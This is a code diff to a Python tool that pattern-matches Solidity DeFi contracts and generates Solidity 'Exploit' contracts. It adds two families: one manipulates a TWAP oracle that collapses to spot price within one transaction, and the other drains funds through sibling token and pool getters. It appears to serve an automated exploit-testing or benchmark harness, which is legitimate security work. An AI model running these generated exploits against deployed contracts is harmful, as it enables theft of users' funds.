@@ -28,6 +28,8 @@ def iter_defi_families(src: str, name: str) -> Iterator[Tuple[str, str]]:
     yield from _donation_accounting_dos(s, fns, name)
     yield from _governance_flashloan(s, fns, name)
     yield from _execute_before_schedule(s, fns, name)
+    yield from _twap_as_spot(s, fns, name)
+    yield from _cross_getter_drain(s, fns, name)
 
 
 def _unpermissioned_callback(s, fns, name):
@@ -201,5 +203,129 @@ def _execute_before_schedule(s, fns, name):
         + "    }\n"
         + "    function rescue(address t) external {\n"
         + "        try ILock(t).schedule(new address[](0), new uint256[](0), new bytes[](0), bytes32(0)) {}\n catch {}\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _twap_as_spot(s, fns, name):
+    """Puppet-v1/v3-shaped desk whose 'TWAP' is the current reserve ratio.
+
+    Real time-window TWAP cannot move inside one IExploit.run (harness does
+    not warp). This family fires when consult/twap/observe/cumulative is
+    present AND there is a borrow/swap against it — the same-tx skew that
+    already works on NaiveOracle.
+    """
+    if not re.search(
+        r"\btwap\b|price0Cumulative|blockTimestampLast|function\s+(observe|consult)\s*\(",
+        s,
+        re.I,
+    ):
+        return
+    borrow = next(
+        (f for f in fns if re.search(r"borrow|liquidate|leverage", f["name"], re.I)),
+        None,
+    )
+    swap = next((f for f in fns if re.search(r"^swap", f["name"], re.I)), None)
+    consult = next(
+        (f for f in fns if re.search(r"twap|consult|observe|spotPrice|getPrice", f["name"], re.I)),
+        None,
+    )
+    if not (borrow or swap):
+        return
+    action = borrow or swap
+    price_fn = consult["name"] if consult else "consult"
+    yield (
+        f"twap-as-spot:{action['name']}",
+        HEADER
+        + "// Family: TWAP that collapses to spot inside one run().\n"
+        + "// Skew the pool, then borrow/swap against consult/twap.\n"
+        + "interface IT {\n"
+        + f"    function {action['name']}(uint256) external payable;\n"
+        + f"    function {price_fn}() external view returns (uint256);\n"
+        + "    function token() external view returns (address);\n"
+        + "    function pool() external view returns (address);\n"
+        + "    function pair() external view returns (address);\n"
+        + "}\n"
+        + "interface IERC20 {\n"
+        + "    function transfer(address,uint256) external returns (bool);\n"
+        + "    function balanceOf(address) external view returns (uint256);\n"
+        + "    function approve(address,uint256) external returns (bool);\n}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + "        address pool; address token;\n"
+        + "        try IT(t).pool() returns (address p) { pool = p; } catch {}\n"
+        + "        try IT(t).pair() returns (address p) { if (pool == address(0)) pool = p; } catch {}\n"
+        + "        try IT(t).token() returns (address k) { token = k; } catch {}\n"
+        + "        if (token != address(0) && pool != address(0)) {\n"
+        + "            uint256 b = IERC20(token).balanceOf(address(this));\n"
+        + "            if (b > 0) { IERC20(token).transfer(pool, b); }\n"
+        + "        }\n"
+        + f"        try IT(t).{action['name']}{{value: msg.value}}(1 ether) {{}} catch {{}}\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _cross_getter_drain(s, fns, name):
+    """Getter-wired siblings. Covers desks that expose token()/pool()/oracle()."""
+    getters = []
+    for f in fns:
+        if f["args"]:
+            continue
+        if re.match(
+            r"^(token|token0|token1|pair|pool|oracle|router|factory|asset|collateral)$",
+            f["name"] or "",
+            re.I,
+        ):
+            getters.append(f)
+    if not getters:
+        if not re.search(r"(IERC20|address)\s+(public\s+)?(token|pool|oracle|pair)\b", s):
+            return
+    drain = next(
+        (f for f in fns if f["external"] and re.search(
+            r"borrow|withdraw|swap|drain|liquidate|execute", f["name"], re.I)),
+        None,
+    )
+    if not drain:
+        return
+    gnames = [g["name"] for g in getters[:6]] or ["token", "pool"]
+    tries = "\n".join(
+        f"        try IT(t).{g}() returns (address a) {{ if (sib == address(0)) sib = a; }} catch {{}}"
+        for g in gnames
+    )
+    iface_g = "".join(f"    function {g}() external view returns (address);\n" for g in gnames)
+    arglist = ",".join(
+        "uint256" if t.startswith("uint") else
+        ("address" if "address" in t else "bytes" if t.startswith("bytes") else t)
+        for t, _ in drain["args"]
+    )
+    call_args = []
+    for t, _n in drain["args"]:
+        if t.startswith("uint"):
+            call_args.append("1 ether")
+        elif "address" in t:
+            call_args.append("address(this)")
+        elif t.startswith("bytes"):
+            call_args.append('""')
+        else:
+            call_args.append("0")
+    yield (
+        f"cross-getter:{drain['name']}",
+        HEADER
+        + "// Family: cross-contract via public getters (same compilation unit / Setup).\n"
+        + "interface IERC20 { function transfer(address,uint256) external returns (bool);\n"
+        + "    function balanceOf(address) external view returns (uint256); }\n"
+        + "interface IT {\n"
+        + iface_g
+        + f"    function {drain['name']}({arglist}) external payable;\n"
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + "        address sib;\n"
+        + tries + "\n"
+        + "        if (sib != address(0)) {\n"
+        + "            uint256 b = IERC20(sib).balanceOf(address(this));\n"
+        + "            if (b > 0) { try IERC20(sib).transfer(t, b) {} catch {} }\n"
+        + "        }\n"
+        + f"        try IT(t).{drain['name']}{{value: msg.value}}({', '.join(call_args)}) {{}} catch {{}}\n"
         + "    }\n    receive() external payable {}\n}\n",
     )
